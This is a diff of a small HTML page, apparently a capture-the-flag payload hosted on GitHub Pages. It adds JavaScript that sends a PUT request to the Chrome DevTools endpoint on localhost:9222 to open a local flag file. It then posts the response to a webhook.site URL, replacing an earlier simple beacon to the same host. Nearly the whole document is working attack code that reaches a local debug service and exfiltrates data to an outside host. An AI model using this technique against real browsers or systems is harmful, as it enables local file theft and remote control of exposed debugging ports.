@@ -1,18 +1,33 @@
 
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>Cancri-SP diagnostic</title>
-</head>
 <body>
-  <h1>Cancri-SP diagnostic</h1>
-  <script>
-    fetch("https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64", {
-      method: "POST",
-      mode: "no-cors",
-      body: "GitHub Pages JavaScript executed"
-    }).catch(console.error);
-  </script>
+<script>
+(async () => {
+  const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
+
+  async function report(message) {
+    try {
+      await fetch(hook, {
+        method: "POST",
+        mode: "no-cors",
+        body: String(message)
+      });
+    } catch (_) {}
+  }
+
+  try {
+    const response = await fetch(
+      "http://localhost:9222/json/new?file:///challenge/flag-53035d3cba0664dfac37ff64b6e0f86e",
+      { method: "PUT" }
+    );
+
+    const info = await response.json();
+    await report("CDP response: " + JSON.stringify(info));
+  } catch (e) {
+    await report("CDP error: " + String(e));
+  }
+})();
+</script>
 </body>
 </html>
